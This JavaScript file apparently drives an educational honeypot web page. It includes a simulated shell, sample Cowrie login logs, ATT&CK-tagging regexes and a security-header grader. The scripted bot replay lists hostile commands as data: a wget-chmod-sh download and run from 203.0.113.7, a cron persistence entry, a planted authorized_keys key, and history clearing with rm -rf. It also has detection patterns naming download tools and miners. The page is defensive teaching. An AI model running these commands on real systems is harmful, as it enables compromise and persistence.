/* Honeypot — the interactive parts: headings that decode, chapter nav, the port
 * explorer, the fake shell, and the grader. Independent of the WebGL stage, so
 * everything here still works when WebGL doesn't.
 */
(() => {
  "use strict";
  const $ = (s, el = document) => el.querySelector(s);
  const $$ = (s, el = document) => [...el.querySelectorAll(s)];
  const reduceMotion = matchMedia("(prefers-reduced-motion: reduce)").matches;
  const esc = s => String(s).replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c]);
  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const stamp = () => new Date().toISOString().replace(/\.\d+Z$/, "Z");

  // ---------- headings decode like a cracked password ----------
  const GLYPHS = "!<>-_\\/[]{}=+*^?#01ABCDEF$%&";
  function decode(el) {
    const final = el.textContent;
    el.setAttribute("aria-label", final);
    const start = performance.now(), dur = 900;
    (function tick(now) {
      const k = Math.min(1, (now - start) / dur);
      let out = "";
      for (let i = 0; i < final.length; i++) {
        const c = final[i];
        out += c === " " || i / final.length < k * 1.15 - .1 ? c : GLYPHS[(Math.random() * GLYPHS.length) | 0];
      }
      el.textContent = k < 1 ? out : final;
      if (k < 1) requestAnimationFrame(tick);
    })(start);
  }
  if (!reduceMotion) {
    const seen = new WeakSet();
    const io = new IntersectionObserver(es => es.forEach(e => {
      if (e.isIntersecting && !seen.has(e.target)) { seen.add(e.target); decode(e.target); }
    }), { threshold: .6 });
    $$(".scene h2").forEach(h => io.observe(h));
  }

  // tickers loop by sliding half their width, so each holds its text twice over
  $$(".ticker div").forEach(d => (d.textContent = d.textContent.repeat(6)));
  if (reduceMotion) $$(".ticker div").forEach(d => (d.style.animation = "none"));

  // ---------- chapter nav ----------
  const links = new Map($$(".chapters a").map(a => [a.getAttribute("href").slice(1), a]));
  const chapterIO = new IntersectionObserver(es => es.forEach(e => {
    if (!e.isIntersecting) return;
    links.forEach(a => a.removeAttribute("aria-current"));
    links.get(e.target.id)?.setAttribute("aria-current", "true");
  }), { rootMargin: "-45% 0px -50% 0px" });
  $$("main > section[id]").forEach(s => chapterIO.observe(s));

  // ---------- inside the trap: the ports ----------
  const PORTS = {
    22: {
      end: "cowrie (fake)",
      title: "SSH, answered by Cowrie",
      text: "The door every bot tries first. Cowrie completes the handshake as <code>OpenSSH 8.9p1 Ubuntu</code>, logs every username and password, and lets some guesses \"work\" so it can watch what the bot does next.",
      log: [
        { eventid: "cowrie.login.failed", username: "root", password: "admin", src_ip: "203.0.113.57" },
        { eventid: "cowrie.login.failed", username: "root", password: "root", src_ip: "203.0.113.57" },
        { eventid: "cowrie.login.success", username: "root", password: "123456", src_ip: "203.0.113.57" },
      ],
    },
    23: {
      end: "cowrie (fake)",
      title: "Telnet, answered by Cowrie",
      text: "Old, unencrypted remote login that nothing modern should use. It's mostly hit by IoT botnets in the Mirai family, which hunt for cameras and routers still on their factory passwords. They announce themselves with a <code>busybox</code> check.",
      log: [
        { eventid: "cowrie.login.success", username: "admin", password: "admin", src_ip: "198.51.100.23" },
        { eventid: "cowrie.command.input", input: "enable; system; shell; sh", src_ip: "198.51.100.23" },
        { eventid: "cowrie.command.input", input: "/bin/busybox ECCHI", src_ip: "198.51.100.23" },
      ],
    },
    80: {
      end: "fake WordPress",
      title: "A website, answered by a fake WordPress",
      text: "A tiny Python server that claims to be Apache running an out-of-date WordPress. It serves a login page and a home page and returns 404 for everything else, but it writes down every request. Try it.",
      log: null,
    },
    22222: {
      end: "real sshd",
      title: "The only real door",
      text: "My own admin login, moved off port 22 so bots never meet it. It accepts SSH keys only, never passwords. The honeypot doesn't log it, because it isn't bait.",
      log: null,
    },
  };
  const detail = $(".port-detail"), probe = $(".probe"), laneEnd = $(".lane-end");
  function showPort(port) {
    const p = PORTS[port];
    $$(".ports button").forEach(b => b.setAttribute("aria-selected", String(b.dataset.port === String(port))));
    laneEnd.textContent = p.end;
    $(".lane").classList.toggle("real", port === "22222");
    detail.innerHTML = `<h3>${p.title}</h3><p>${p.text}</p>` +
      (p.log ? `<pre>${p.log.map(l => esc(JSON.stringify({ ...l, timestamp: stamp() }))).join("\n")}</pre>` : "");
    probe.hidden = port !== "80";
    if (port === "80") sendProbe();
  }
  $$(".ports button").forEach(b => b.addEventListener("click", () => showPort(b.dataset.port)));

  const PATH_NOTES = {
    "/": "The home page. Its generator tag claims WordPress 6.1.1, an outdated version. That's part of the bait.",
    "/.env": "On a real site, this file often holds database passwords and API keys. It's the single most-requested secret on the web.",
    "/wp-login.php": "A WordPress login form. Bots POST thousands of password guesses here, and every one is logged.",
    "/wp-admin": "Redirects bots to the same fake login.",
    "/.git/config": "On a real site, an exposed .git folder can hand over the entire source code, history and all.",
    "/backup.sql": "A forgotten database dump: every customer record in one download.",
    "/phpinfo.php": "A debug page that lists the server's whole configuration.",
  };
  const probeInput = $("#probe-path"), probeOut = $(".probe-out");
  function sendProbe() {
    let path = probeInput.value.trim() || "/";
    if (!path.startsWith("/")) path = "/" + path;
    const bare = path.split("?")[0];
    const ok = bare === "/" || bare.startsWith("/wp-login.php") || bare.startsWith("/wp-admin");
    const body = bare === "/" ? '<!DOCTYPE html><html><head><title>Welcome</title><meta name="generator" content="WordPress 6.1.1">…'
      : ok ? "<!DOCTYPE html><html><head><title>Log In &lsaquo; Site &#8212; WordPress</title>…" : "<html><body><h1>Not Found</h1></body></html>";
    const entry = { ts: stamp(), src_ip: "you", method: "GET", path, version: "HTTP/1.1", user_agent: navigator.userAgent.slice(0, 60) + "…" };
    const note = PATH_NOTES[bare] || "Not a path we planted, and it's still logged. Unknown paths show what bots are hunting for this week.";
    probeOut.innerHTML =
      `<span class="dim">HTTP/1.1 ${ok ? "200 OK" : "404 Not Found"}\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html; charset=UTF-8</span>\n\n${esc(body)}\n\n` +
      `<span class="hl">→ appended to requests.jsonl</span>\n${esc(JSON.stringify(entry))}\n\n<span class="note">◆ ${esc(note)}</span>`;
  }
  probe.addEventListener("submit", e => { e.preventDefault(); sendProbe(); });
  $$(".probe .chips button").forEach(b => b.addEventListener("click", () => { probeInput.value = b.textContent; sendProbe(); }));
  showPort("22");

  // ---------- be the bot: a fake shell ----------
  // Same rules as honeypot/analysis/attack_map.py, so the page and the real
  // analysis tag a command the same way.
  const RULES = [
    ["T1082", "System Information Discovery", "Discovery", /\buname\b|\/proc\/cpuinfo|\blscpu\b|\/proc\/meminfo|\bfree\s+-m\b|\bnproc\b|\bdmidecode\b/i],
    ["T1033", "System Owner/User Discovery", "Discovery", /\bwhoami\b|^\s*id\b|\bw\b\s*$|\blast\b/i],
    ["T1016", "Network Configuration Discovery", "Discovery", /\bifconfig\b|\bip\s+(a|addr|route)\b|\/etc\/resolv\.conf|\bnetstat\b|\bss\s+-/i],
    ["T1057", "Process Discovery", "Discovery", /\bps\s+(aux|-ef|-A)\b|\btop\b|\bpgrep\b/i],
    ["T1083", "File and Directory Discovery", "Discovery", /^\s*ls\b|\bfind\s+\//i],
    ["T1105", "Ingress Tool Transfer", "Command and Control", /\b(wget|curl|tftp|ftpget)\b/i],
    ["T1059.004", "Unix Shell", "Execution", /\bsh\s+\S+\.sh\b|\bbash\s+-c\b|\/bin\/busybox|\bsh\s+-c\b/i],
    ["T1222.002", "File Permissions Modification", "Defense Evasion", /\bchmod\s+(\+x|7[0-7]{2}|[0-7]?777)\b|\bchattr\b/i],
    ["T1053.003", "Cron", "Persistence", /\bcrontab\b|\/etc\/cron/i],
    ["T1098.004", "SSH Authorized Keys", "Persistence", /authorized_keys/i],
    ["T1098", "Account Manipulation", "Persistence", /\bpasswd\b|\bchpasswd\b|\buseradd\b|\busermod\b/i],
    ["T1070.003", "Clear Command History", "Defense Evasion", /history\s+-c|\.bash_history|HISTFILE|unset\s+HIST/i],
    ["T1070.004", "File Deletion", "Defense Evasion", /\brm\s+-rf?\b/i],
    ["T1496", "Resource Hijacking (mining)", "Impact", /xmrig|minerd|cpuminer|stratum\+tcp|\bc3pool\b|\bmonero\b|nicehash/i],
    ["T1562.001", "Disable or Modify Tools", "Defense Evasion", /\b(pkill|killall)\b|systemctl\s+(stop|disable)|\bufw\s+disable\b|iptables\s+-F/i],
    ["T1018", "Remote System Discovery", "Discovery", /\bnmap\b|\bmasscan\b|\bzmap\b|\bping\s/i],
  ];
  function techniques(line) {
    const parts = line.split(/;|&&|\|\|?/);
    return RULES.filter(r => parts.some(p => r[3].test(p)));
  }

  const HOST = "web-prod-02";
  const FS = {
    "/": "bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var",
    "/root": "",
    "/tmp": "",
    "/home": "ubuntu",
    "/var": "backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www",
  };
  const FILES = {
    "/proc/cpuinfo": [0, 1].map(n => `processor\t: ${n}\nvendor_id\t: GenuineIntel\nmodel name\t: Intel(R) Xeon(R) CPU E5-2680 v4 @ 2.40GHz\ncpu MHz\t\t: 2399.998\ncache size\t: 35840 KB\n`).join("\n"),
    "/proc/meminfo": "MemTotal:        2030524 kB\nMemFree:          611204 kB\nMemAvailable:    1402284 kB",
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash",
    "/etc/os-release": 'PRETTY_NAME="Ubuntu 22.04.3 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\nVERSION="22.04.3 LTS (Jammy Jellyfish)"\nID=ubuntu',
    "/etc/resolv.conf": "nameserver 127.0.0.53\noptions edns0 trust-ad",
    "/etc/hostname": HOST,
  };
  let cwd = "/root", hist = [], downloads = new Set(), busy = false;
  const session = Math.random().toString(16).slice(2, 14);
  const out = $(".term-out"), input = $("#cmd"), promptLabel = $(".term-in label");
  function resolve(p) {
    if (p === "~" || p.startsWith("~/")) p = "/root" + p.slice(1);
    else if (!p.startsWith("/")) p = cwd + "/" + p;
    const parts = [];
    for (const seg of p.split("/")) {
      if (seg === "..") parts.pop();
      else if (seg && seg !== ".") parts.push(seg);
    }
    return "/" + parts.join("/");
  }
  const promptText = () => `root@${HOST}:${cwd === "/root" ? "~" : cwd}#`;

  function print(text, cls = "") {
    const line = document.createElement("div");
    if (cls) line.className = cls;
    line.textContent = text;
    out.appendChild(line);
    out.scrollTop = out.scrollHeight;
  }
  function run(argv) {
    const [cmd, ...args] = argv;
    const notes = [];
    const flags = args.filter(a => a.startsWith("-")).join(" ");
    let o = "";
    switch (cmd) {
      case undefined: case "": break;
      case "sudo": return run(args);
      case "uname":
        o = flags.includes("a") ? `Linux ${HOST} 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
          : flags.includes("m") ? "x86_64" : flags.includes("r") ? "5.15.0-91-generic" : flags.includes("n") ? HOST : "Linux"; break;
      case "whoami": o = "root"; break;
      case "id": o = "uid=0(root) gid=0(root) groups=0(root)"; break;
      case "hostname": o = HOST; break;
      case "pwd": o = cwd; break;
      case "nproc": o = "2"; break;
      case "lscpu": o = "Architecture:            x86_64\nCPU(s):                  2\nModel name:              Intel(R) Xeon(R) CPU E5-2680 v4 @ 2.40GHz"; break;
      case "free": o = flags.includes("m")
        ? "               total        used        free      shared  buff/cache   available\nMem:            1982         612         596           1         773        1369\nSwap:              0           0           0"
        : "               total        used        free      shared  buff/cache   available\nMem:         2030524      627188      611204        1100      792132     1402284\nSwap:              0           0           0"; break;
      case "uptime": o = " 14:02:11 up 41 days,  3:17,  1 user,  load average: 0.00, 0.01, 0.00"; break;
      case "w": o = " 14:02:11 up 41 days,  3:17,  1 user,  load average: 0.00, 0.01, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    203.0.113.57     14:01    0.00s  0.01s  0.00s w"; break;
      case "last": o = "root     pts/0        203.0.113.57     Wed Nov  4 14:01   still logged in\n\nwtmp begins Mon Sep 21 09:12:40 2026"; break;
      case "ps": o = "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.5 167540 11756 ?        Ss   Sep21   1:02 /sbin/init\nroot         611  0.0  0.3  15432  7748 ?        Ss   Sep21   0:00 sshd: /usr/sbin/sshd -D\nwww-data    1204  0.0  0.9 201088 19032 ?        S    Sep21   0:41 /usr/sbin/apache2 -k start\nroot        9921  0.0  0.1   8992  3612 pts/0    R+   14:02   0:00 ps aux"; break;
      case "top": o = "top: failed tty get"; break;
      case "ifconfig": case "ip":
        o = "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.0.0.4  netmask 255.255.255.0  broadcast 10.0.0.255\n        ether 52:54:00:3a:91:7c  txqueuelen 1000  (Ethernet)"; break;
      case "netstat": case "ss":
        o = "Proto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN"; break;
      case "cd": {
        const to = resolve(args[0] || "~");
        if (FS[to] !== undefined) cwd = to; else o = `-bash: cd: ${args[0]}: No such file or directory`;
        break;
      }
      case "ls": {
        const dir = resolve(args.find(a => !a.startsWith("-")) || cwd);
        if (FS[dir] === undefined) { o = `ls: cannot access '${dir}': No such file or directory`; break; }
        let names = FS[dir] ? FS[dir].split(/\s+/) : [];
        names = names.concat([...downloads].filter(f => f.startsWith(dir + "/") && f.slice(dir.length + 1).indexOf("/") < 0).map(f => f.slice(dir.length + 1)));
        if (flags.includes("a")) names = [".", "..", ...(dir === "/root" ? [".bashrc", ".profile", ".ssh"] : []), ...names];
        else names = names.filter(n => !n.startsWith("."));
        o = names.join("  ");
        break;
      }
      case "cat": {
        const f = resolve(args[0] || "");
        if (FILES[f] !== undefined) o = FILES[f];
        else if (downloads.has(f)) o = "\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x02\0>\0…";
        else o = `cat: ${args[0] || ""}: No such file or directory`;
        break;
      }
      case "echo": o = args.join(" "); break;
      case "wget": case "curl": {
        const url = args.find(a => /^(https?|ftp):\/\//.test(a) || /^\d+\.\d+\.\d+\.\d+/.test(a));
        if (!url) { o = `${cmd}: missing URL`; break; }
        const oi = args.findIndex(a => a === "-O" || a === "-o");
        const name = oi >= 0 && args[oi + 1] ? args[oi + 1] : url.split("/").pop() || "index.html";
        downloads.add(resolve(name));
        o = cmd === "wget"
          ? `--${new Date().toISOString().slice(0, 19).replace("T", " ")}--  ${url}\nConnecting to ${url.split("/")[2]}:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 1048576 (1.0M) [application/octet-stream]\nSaving to: '${name}'\n\n${name}            100%[===================>]   1.00M  3.21MB/s    in 0.3s`
          : (oi >= 0 ? "  % Total    % Received % Xferd  Average Speed   Time\n100 1024k  100 1024k    0     0  3214k      0  0:00:01" : "\x7fELF…");
        notes.push("Captured. The honeypot keeps the file on the server and sends home only its SHA-256 fingerprint. It never runs.");
        break;
      }
      case "tftp": case "ftpget": o = `${cmd}: timeout`; break;
      case "chmod": if (args.length < 2) o = "chmod: missing operand"; break;
      case "sh": case "bash":
        if (args[0] === "-c") return run(args.slice(1).join(" ").replace(/^['"]|['"]$/g, "").split(/\s+/));
        if (args[0] && downloads.has(resolve(args[0]))) notes.push("Cowrie pretends the script ran. Nothing actually executed.");
        else if (args[0]) o = `${cmd}: ${args[0]}: No such file or directory`;
        break;
      case "crontab": if (flags.includes("l")) o = "no crontab for root"; break;
      case "history":
        if (flags.includes("c")) { hist = []; notes.push("History cleared here, but not in Cowrie's log. Every keystroke was already recorded."); }
        else o = hist.map((h, i) => `${String(i + 1).padStart(5)}  ${h}`).join("\n");
        break;
      case "rm": args.filter(a => !a.startsWith("-")).forEach(a => downloads.delete(resolve(a))); break;
      case "passwd": o = "passwd: password updated successfully"; notes.push("Bots change the password to lock out other bots. In a fake shell, it changes nothing."); break;
      case "useradd": case "usermod": case "chpasswd": case "pkill": case "killall": case "kill": case "chattr": case "mkdir": case "touch": break;
      case "systemctl": case "iptables": break;
      case "ufw": o = args[0] === "disable" ? "Firewall stopped and disabled on system startup" : "Status: active";
        if (args[0] === "disable") notes.push("A fake firewall inside a fake shell. The real one sits outside it, untouched.");
        break;
      case "busybox": case "/bin/busybox":
        o = args[0] ? `${args[0]}: applet not found` : "BusyBox v1.30.1 (Ubuntu 1:1.30.1-7ubuntu3) multi-call binary.";
        if (args[0]) notes.push("A Mirai-family fingerprint: the bot checks whether busybox exists before it picks a payload.");
        break;
      case "ping": o = `PING ${args.find(a => !a.startsWith("-")) || ""} 56(84) bytes of data.\n64 bytes: icmp_seq=1 ttl=57 time=11.2 ms\n64 bytes: icmp_seq=2 ttl=57 time=10.9 ms`; break;
      case "enable": case "system": case "shell": case "true": case "export": case "unset": break;
      case "help": notes.push("Real bots don't ask for help. Try: uname -a · cat /proc/cpuinfo · wget http://203.0.113.7/x86 · crontab -l · passwd · history -c"); break;
      default:
        if (/^(\.{0,2}\/|\/)/.test(cmd) && downloads.has(resolve(cmd))) {
          notes.push("Cowrie fakes the run. The binary never executes; the bot just sees a quiet prompt.");
        } else o = `-bash: ${cmd}: command not found`;
    }
    return { o, notes };
  }
  function filter(lines, argv) {
    const [cmd, ...args] = argv;
    if (cmd === "grep") {
      const pat = args.filter(a => !a.startsWith("-"))[0] || "", ci = args.includes("-i");
      return lines.filter(l => (ci ? l.toLowerCase().includes(pat.toLowerCase()) : l.includes(pat)));
    }
    if (cmd === "wc") return [String(lines.filter(l => l !== "").length)];
    if (cmd === "head") { const n = parseInt((args.join(" ").match(/\d+/) || ["10"])[0], 10); return lines.slice(0, n); }
    if (cmd === "sort") return [...lines].sort();
    if (cmd === "uniq") return lines.filter((l, i) => l !== lines[i - 1]);
    return [];
  }
  const split = s => (s.match(/"[^"]*"|'[^']*'|\S+/g) || []).map(a => a.replace(/^["']|["']$/g, ""));

  function execute(line) {
    print(`${promptText()} ${line}`, "cmd");
    if (line.trim()) hist.push(line);
    if (line.trim() === "clear") { out.innerHTML = ""; return; }
    if (/^\s*(exit|logout)\s*$/.test(line)) {
      print("logout\nConnection to " + HOST + " closed.");
      print("◆ The bot always comes back. Reconnected.", "note");
      cwd = "/root"; promptLabel.textContent = promptText();
      return;
    }
    const notes = [];
    for (const seg of line.split(/;|&&/)) {
      const red = seg.match(/(.*?)\s*>>?\s*(\S+)\s*$/);
      const body = red ? red[1] : seg;
      const stages = body.split(/\|/).map(s => split(s.trim()));
      const first = run(stages[0]);
      let lines = first.o ? first.o.split("\n") : [];
      for (const st of stages.slice(1)) {
        if (st[0] === "crontab") { lines = []; continue; }
        lines = filter(lines, st);
      }
      notes.push(...first.notes);
      if (red) {
        if (/authorized_keys/.test(red[2])) notes.push("A bot's own SSH key, planted so it can walk back in without a password.");
      } else if (lines.length) print(lines.join("\n"));
    }
    notes.forEach(n => print("◆ " + n, "note"));
    promptLabel.textContent = promptText();
    record(line);
  }

  // what the analysis sees
  const counts = new Map(), techList = $(".tech-list"), logLine = $(".log-line");
  function record(line) {
    logLine.textContent = JSON.stringify({ eventid: "cowrie.command.input", input: line, session, src_ip: "203.0.113.57", timestamp: stamp() });
    const hits = techniques(line);
    for (const [id, name, tactic] of hits) {
      counts.set(id, { name, tactic, n: (counts.get(id)?.n || 0) + 1 });
      const li = $(`.chain li[data-tactic="${tactic}"]`);
      li.classList.remove("ping"); void li.offsetWidth; li.classList.add("hit", "ping");
    }
    if (!counts.size) return;
    techList.innerHTML = [...counts].map(([id, t]) =>
      `<li class="${hits.some(h => h[0] === id) ? "new" : ""}"><a href="https://attack.mitre.org/techniques/${id.replace(".", "/")}/" target="_blank" rel="noopener">${id}</a> ${esc(t.name)}<b>×${t.n}</b></li>`).join("");
  }

  $(".term-in").addEventListener("submit", e => {
    e.preventDefault();
    if (busy) return;
    const line = input.value;
    input.value = "";
    execute(line);
  });
  $(".term").addEventListener("click", e => { if (!e.target.closest("a") && !getSelection().toString()) input.focus({ preventScroll: true }); });

  async function typeAndRun(line) {
    for (let i = 1; i <= line.length; i++) {
      input.value = line.slice(0, i);
      await sleep(reduceMotion ? 0 : 18 + Math.random() * 30);
    }
    await sleep(reduceMotion ? 0 : 250);
    input.value = "";
    execute(line);
  }
  const BOT = [
    "uname -a; nproc",
    "cat /proc/cpuinfo | grep name | wc -l",
    "cd /tmp; wget http://203.0.113.7/bins.sh; chmod 777 bins.sh; sh bins.sh",
    "crontab -l",
    'echo "* * * * * /tmp/bins.sh" | crontab -',
    'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB…k9 bot@c2" >> ~/.ssh/authorized_keys',
    "pkill -f xmrig; history -c; rm -rf /tmp/bins.sh",
  ];
  const runBtn = $(".run-bot");
  runBtn.addEventListener("click", async () => {
    if (busy) return;
    busy = true; runBtn.disabled = true; input.readOnly = true;
    print("◆ Replaying a typical bot session: look around, download, persist, cover tracks.", "note");
    for (const line of BOT) { await typeAndRun(line); await sleep(reduceMotion ? 0 : 650); }
    busy = false; runBtn.disabled = false; input.readOnly = false;
  });
  $$(".cmd-chips button:not(.run-bot)").forEach(b => b.addEventListener("click", () => { if (!busy) execute(b.textContent); }));

  print("login as: root", "dim");
  print("root@" + HOST + "'s password: ••••••   (third guess: 123456)", "dim");
  print("Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\n\nLast login: Wed Nov  4 09:12:40 2026 from 198.51.100.23", "dim");
  promptLabel.textContent = promptText();

  // ---------- the grader ----------
  // The issues etceterabusiness.com really had on 1 Nov 2026 (reports/…130117.json),
  // weighted exactly like scanner/scoring.py.
  const WEIGHT = { high: 20, medium: 10, low: 4 };
  const ISSUES = [
    { sev: "high", status: "fail", title: "No SPF record", why: "Anyone can send email that claims to come from this domain.", fix: "DNS TXT @  v=spf1 -all", live: false },
    { sev: "high", status: "fail", title: "No DMARC record", why: "Mail servers have no instruction to reject email forged in this domain's name.", fix: "DNS TXT _dmarc  v=DMARC1; p=reject;", live: false },
    { sev: "medium", status: "fail", title: "No HSTS header", why: "A browser may try plain HTTP first, where the connection can be intercepted.", fix: "Strict-Transport-Security: max-age=31536000", live: true },
    { sev: "medium", status: "warn", title: "CSP does not restrict scripts", why: "The policy exists, but it wouldn't stop a script someone managed to inject.", fix: "script-src 'self' + a hash for the one inline script", live: true },
    { sev: "low", status: "fail", title: "No X-Content-Type-Options", why: "Browsers may guess a file's type and run it as something it isn't.", fix: "X-Content-Type-Options: nosniff", live: true },
    { sev: "low", status: "fail", title: "Site can be framed", why: "Another site could load this one invisibly and steal clicks (clickjacking).", fix: "X-Frame-Options: SAMEORIGIN", live: true },
    { sev: "low", status: "warn", title: "No Referrer-Policy", why: "Full page addresses can leak to other sites when visitors click out.", fix: "Referrer-Policy: strict-origin-when-cross-origin", live: true },
  ].map(i => ({ ...i, cost: WEIGHT[i.sev] / (i.status === "warn" ? 2 : 1), fixed: false }));

  const issuesEl = $(".issues"), letterEl = $(".grade-letter"), scoreEl = $(".grade-score span"), meterEl = $(".meter i");
  issuesEl.innerHTML = ISSUES.map((i, n) => `
    <li><button type="button" class="issue" aria-pressed="false" data-i="${n}">
      <span class="sev ${i.sev}">${i.sev}${i.status === "warn" ? " · warn" : ""}</span>
      <span class="cost">−${i.cost}</span>
      <strong>${esc(i.title)}</strong>
      <span class="why">${esc(i.why)}</span>
      <code class="fix">${esc(i.fix)}</code>
      <span class="live ${i.live ? "yes" : "no"}">${i.live ? "Fixed on the live site" : "Live: waiting on two DNS records"}</span>
    </button></li>`).join("");
  let shown = 35;
  function grade(s) { return s >= 90 ? "A" : s >= 80 ? "B" : s >= 70 ? "C" : s >= 60 ? "D" : "F"; }
  function update() {
    const score = Math.max(0, Math.round(100 - ISSUES.reduce((t, i) => t + (i.fixed ? 0 : i.cost), 0)));
    $$(".issue").forEach(b => b.setAttribute("aria-pressed", String(ISSUES[b.dataset.i].fixed)));
    const g = grade(score);
    if (letterEl.textContent !== g) {
      letterEl.textContent = g;
      letterEl.classList.remove("flip"); void letterEl.offsetWidth; letterEl.classList.add("flip");
    }
    letterEl.dataset.grade = g;
    meterEl.style.width = score + "%";
    const from = shown, t0 = performance.now();
    (function tick(now) {
      const k = reduceMotion ? 1 : Math.min(1, (now - t0) / 500);
      shown = Math.round(from + (score - from) * (1 - Math.pow(1 - k, 3)));
      scoreEl.textContent = shown;
      if (k < 1) requestAnimationFrame(tick);
    })(t0);
  }
  issuesEl.addEventListener("click", e => {
    const b = e.target.closest(".issue");
    if (!b) return;
    ISSUES[b.dataset.i].fixed = !ISSUES[b.dataset.i].fixed;
    update();
  });
  $$("[data-preset]").forEach(b => b.addEventListener("click", () => {
    const p = b.dataset.preset;
    ISSUES.forEach(i => (i.fixed = p === "all" || (p === "now" && i.live)));
    update();
  }));
  update();
})();
